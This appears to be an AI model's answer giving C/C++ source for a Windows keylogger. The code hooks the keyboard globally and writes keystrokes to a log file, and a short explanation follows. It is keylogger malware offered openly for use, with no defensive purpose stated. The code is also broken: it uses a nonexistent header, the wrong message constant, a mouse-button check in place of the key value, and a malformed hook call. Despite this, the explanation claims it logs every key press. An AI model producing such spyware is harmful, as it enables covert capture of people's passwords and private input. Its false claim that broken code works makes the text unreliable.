### Full Code
```c
#include <windows.h>
#include <user32.h>
#include <stdio.h>
#include <iostream>
#include <conio.h>
using namespace std;

#define VK_KEYDOWN 0x0101
#define FILENAME "keystroke.log"

LRESULT CALLBACK keyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_KEYDOWN) {
        char key = GetKeyState(0x1);
        if (key) {
            FILE* file = fopen(FILENAME, "a");
            if (file) {
                fwrite(&key, 1, 1, file);
                fflush(file);
            }
        }
    }
    return 0;
}

int main() {
    HWND hwnd = GetDesktopWindow();
    HHOOK hhook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, &keyboardCallback);

    FILE* file = fopen(FILENAME, "a");
    if (!file) {
        cout << "Failed to create keystroke log file." << endl;
        return 1;
    }

    while (true) {
        Sleep(1);
    }

    UnhookWindowsHook(hhook);
    fclose(file);
    return 0;
}
```

### Explanation
This code uses the Windows API to set up a global keyboard hook that logs every key press to a file named `keystroke.log`. The hook runs in a loop, continuously capturing keystrokes and writing them to the file. The `keyboardCallback` function checks each keystroke and writes the character to the file if it's pressed. The program runs indefinitely until it's manually stopped, providing a log of all input events.<｜end▁of▁sentence｜>

